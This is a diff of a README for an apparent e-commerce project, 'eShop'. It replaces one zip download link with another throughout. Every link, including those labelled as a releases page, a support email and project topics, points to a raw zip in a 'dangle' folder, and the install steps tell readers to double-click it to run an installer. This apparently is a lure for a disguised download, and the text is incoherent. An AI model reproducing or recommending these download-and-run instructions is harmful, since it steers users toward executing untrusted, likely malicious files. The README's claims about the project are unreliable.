@@ -1,6 +1,6 @@
 # 🛒 eShop-ecommerce-site - Shop Easily, Save More
 
-[![Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip%20eShop%20Now-blue?style=for-the-badge)](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip)
+[![Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip%20eShop%20Now-blue?style=for-the-badge)](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip)
 
 ## 📦 About eShop
 
@@ -19,7 +19,7 @@ eShop is an eCommerce website where you can buy various products at very low pri
 
 To get started with eShop, you will need to download the application from our Releases page. Follow these steps:
 
-1. Click the download button above or visit the [Releases page](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip) to find the latest version of eShop.
+1. Click the download button above or visit the [Releases page](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip) to find the latest version of eShop.
 2. Choose the version you want to download based on your operating system.
 3. Follow the instructions to download and save the file to your computer.
 
@@ -27,7 +27,7 @@ To get started with eShop, you will need to download the application from our Re
 
 To install eShop:
 
-1. Visit this page to download: [Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip).
+1. Visit this page to download: [Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip).
 2. After downloading, locate the file on your device.
 3. Double-click the file to run the installer.
 4. Follow the on-screen instructions to complete the installation.
@@ -64,7 +64,7 @@ Once you have eShop installed, you can begin shopping:
 
 ## 📞 Support
 
-For support, please visit our GitHub Issues page or reach out via email at https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip 
+For support, please visit our GitHub Issues page or reach out via email at https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip 
 
 ## 📝 Contributing
 
@@ -76,12 +76,12 @@ We welcome contributions! If you're eager to help, please check our guidelines o
 - Checkout
 - CI/CD Pipelines
 - eCommerce
-- https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip
+- https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip
 - Firebase
 - Material-UI
 - MERN Stack
 - Mongoose
-- https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip
+- https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip
 - Payment Integration
 - PayPal Checkout
 - Progressive Web App
@@ -91,4 +91,4 @@ We welcome contributions! If you're eager to help, please check our guidelines o
 - State Management
 - Stripe Checkout
 
-[![Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip%20eShop%20Now-blue?style=for-the-badge)](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/Shop_e_ecommerce_site_v3.5.zip)
+[![Download eShop](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip%20eShop%20Now-blue?style=for-the-badge)](https://github.com/khizerqureshi/eShop-ecommerce-site/raw/refs/heads/master/dangle/e-ecommerce-site-Shop-1.2.zip)
